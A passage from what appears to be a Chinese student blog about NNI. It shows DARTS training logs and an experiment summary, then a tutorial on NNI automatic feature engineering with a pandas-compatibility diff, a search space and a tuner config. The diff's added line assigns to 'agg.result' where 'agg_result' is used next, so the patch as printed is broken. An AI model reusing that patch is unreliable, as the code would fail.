Train: [599&#x2F;600] Step 460&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 470&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:59] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 480&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 500&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 520&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Final Prec@1 98.7600%</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 000&#x2F;104 Loss 0.146 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:09] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 010&#x2F;104 Loss 0.113 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 020&#x2F;104 Loss 0.135 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:10] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 030&#x2F;104 Loss 0.163 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 040&#x2F;104 Loss 0.159 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:11] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 050&#x2F;104 Loss 0.155 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 060&#x2F;104 Loss 0.150 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:12] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:13] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Step 104&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Valid: [599&#x2F;600] Final Prec@1 97.2400%</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Epoch 599 LR 0.000001</span><br><span class="line">[2021-02-22 21:39:14] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 000&#x2F;520 Loss 0.039 Prec@(1,5) (100.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 010&#x2F;520 Loss 0.063 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:19] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 020&#x2F;520 Loss 0.061 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 030&#x2F;520 Loss 0.064 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 040&#x2F;520 Loss 0.065 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:26] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 050&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 060&#x2F;520 Loss 0.065 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:31] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 080&#x2F;520 Loss 0.066 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 100&#x2F;520 Loss 0.067 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 110&#x2F;520 Loss 0.069 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:43] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 120&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 130&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:48] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:55] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:39:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:00] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 220&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 230&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:12] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 240&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 250&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:17] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 260&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 270&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:22] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 280&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:24] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:27] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:29] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 310&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:32] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:34] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:36] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 340&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:39] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:41] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 360&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:44] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 370&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:46] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 380&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:49] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 390&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:51] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 400&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:53] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 410&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:56] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 420&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:40:58] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 430&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:01] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 440&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:03] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 450&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:05] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 460&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:08] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 470&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:10] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 480&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:13] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 490&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:15] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 500&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:18] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 510&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Step 520&#x2F;520 Loss 0.071 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Train: [600&#x2F;600] Final Prec@1 98.7720%</span><br><span class="line">[2021-02-22 21:41:20] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 000&#x2F;104 Loss 0.150 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 010&#x2F;104 Loss 0.114 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:21] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 020&#x2F;104 Loss 0.136 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 030&#x2F;104 Loss 0.164 Prec@(1,5) (96.8%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:22] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 040&#x2F;104 Loss 0.160 Prec@(1,5) (96.9%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:23] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 050&#x2F;104 Loss 0.156 Prec@(1,5) (97.0%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 060&#x2F;104 Loss 0.151 Prec@(1,5) (97.1%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:24] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 070&#x2F;104 Loss 0.140 Prec@(1,5) (97.2%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 080&#x2F;104 Loss 0.143 Prec@(1,5) (97.2%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:25] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 090&#x2F;104 Loss 0.137 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 100&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 99.9%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Step 104&#x2F;104 Loss 0.139 Prec@(1,5) (97.3%, 100.0%)</span><br><span class="line">[2021-02-22 21:41:26] INFO (nni&#x2F;MainThread) Valid: [600&#x2F;600] Final Prec@1 97.2500%</span><br></pre></td></tr></table></figure>
<p>调用<code>nni.algorithms.nas.pytorch.darts.DartsTrainer</code>可进行DARTS的架构搜索。再通过<code>retrain.py</code>再次进行训练，最终在第454个epoch达到了97%的准确率，重训练过程中精确度最高能够达到98%。</p>
<p>由于DARTS的候选边在MobileNet中并没有出现，所以最终生成的模型相对变化较大，但与此同时，性能上的提升也十分明显。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ul>
<li><p>我们使用了Google Colab上的GPU进行训练，通过NNI的官方文档提供的指导说明，通过反向代理访问到了NNI的Web UI，使得我们能够在有限的算力下完成NNI的有关实验。</p>
</li>
<li><p>在算力允许的条件下，每一次trial的epoch最好设置得足够大，这样所得的模型最终结果相对能够更加精确。</p>
</li>
<li><p>NNI在超参调优和神经网络架构搜索方面真正解决了用户痛点所在，省下了繁琐的人工调参以及模型优化时间，以更低的时间成本，更高的工作效率为相关学习研究提供很大的方便。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/29/NNI-Student-Program-2020-Task3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/29/NNI-Student-Program-2020-Task3/" class="post-title-link" itemprop="url">NNI Student Program 2020 Task3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-29 17:18:56" itemprop="dateCreated datePublished" datetime="2021-01-29T17:18:56+08:00">2021-01-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/01/29/NNI-Student-Program-2020-Task3/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program 2020 Task3" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/29/NNI-Student-Program-2020-Task3/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/29/NNI-Student-Program-2020-Task3/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task-3-进阶任务"><a href="#Task-3-进阶任务" class="headerlink" title="Task 3 进阶任务"></a>Task 3 进阶任务</h1><h2 id="特征工程简介"><a href="#特征工程简介" class="headerlink" title="特征工程简介"></a>特征工程简介</h2><p>有这么一句话在业界广泛流传：</p>
<blockquote>
<p>数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已。</p>
</blockquote>
<p>数据是特征的来源，特征是给定算法下模型精确度的最大决定因素，可见提升特征质量意义重大。</p>
<p>特征工程(Feature Engineering)是机器学习的一个重要分支，指的是通过多种数据处理方法，从原始数据提取出若干个能优秀反映问题的特征，以提升最终算法与模型准确率的过程。</p>
<h2 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h2><p>自动特征工程是一种新技术，是机器学习发展的一大步。自动特征工程能够在降低时间成本的同时，生成更优秀的特征，从而构建出准确率更高的模型。</p>
<p>利用NNI的自动特征工程实现，我们通过简单调用函数便可实现特征工程的自动调优。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>nni</li>
<li>numpy</li>
<li>lightgbm: 微软开源算法</li>
<li>pandas: 基于python的数据分析强力工具</li>
<li>sklearn: 集成了特征工程相关的常用函数</li>
</ul>
<p>建议在conda环境下部署自动特征工程python环境。</p>
<p>此外，由于pandas版本更新，直接运行自带项目会报错，实际上只需修改<code>fe_util.py</code>中的<code>agg</code>参数类型即可，大致修改如下：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def aggregate(df, num_col, col, stat_list = AGGREGATE_TYPE):</span><br><span class="line"><span class="deletion">-   agg_dict = &#123;&#125;</span></span><br><span class="line"><span class="addition">+   agg_list = []</span></span><br><span class="line">    for i in stat_list:</span><br><span class="line"><span class="deletion">-       agg_dict[(&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col)] = i</span></span><br><span class="line"><span class="addition">+       agg_list.append((&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col), i))</span></span><br><span class="line"><span class="deletion">-   agg_result = df.groupby([col])[num_col].agg(agg_dict)</span></span><br><span class="line"><span class="addition">+   agg.result = df.groupby([col])[num_col].agg(agg_list)</span></span><br><span class="line">    r = left_merge(df, agg_result, on = [col])</span><br><span class="line">    df = concat([df, r])</span><br><span class="line">    return df</span><br></pre></td></tr></table></figure>
<p>该修改已提交pull request至原项目。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="配置搜索空间"><a href="#配置搜索空间" class="headerlink" title="配置搜索空间"></a>配置搜索空间</h3><p>NNI的自动特征工程支持count、crosscount、aggregate等一阶与二阶特征运算，配置搜索空间时只需按json格式填写搜索范围。具体填写方法以项目示例搜索空间为例：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;count&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;aggregate&quot;</span>:[</span><br><span class="line">        [<span class="string">&quot;I9&quot;</span>,<span class="string">&quot;I10&quot;</span>,<span class="string">&quot;I11&quot;</span>,<span class="string">&quot;I12&quot;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;crosscount&quot;</span>:[</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入tuner"><a href="#导入tuner" class="headerlink" title="导入tuner"></a>导入tuner</h3><p>导入自动特征工程的tuner时，需要在<code>config.yml</code>中的<code>tuner</code>项添加相关信息，其他地方正常填写即可。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tuner:</span></span><br><span class="line">  <span class="attr">codeDir:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">classFileName:</span> <span class="string">autofe_tuner.py</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">AutoFETuner</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">optimize_mode:</span> <span class="string">maximize</span></span><br></pre></td></tr></table></figure>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Tuner在生成的搜索空间中随机选取一定数量的feature组合，通过<code>nni.get_next_parameter()</code>的接口，以dict的形式返回给单次trial。经一系列处理后运行lightGBM算法，得到最终以AUC形式呈现的结果。</p>
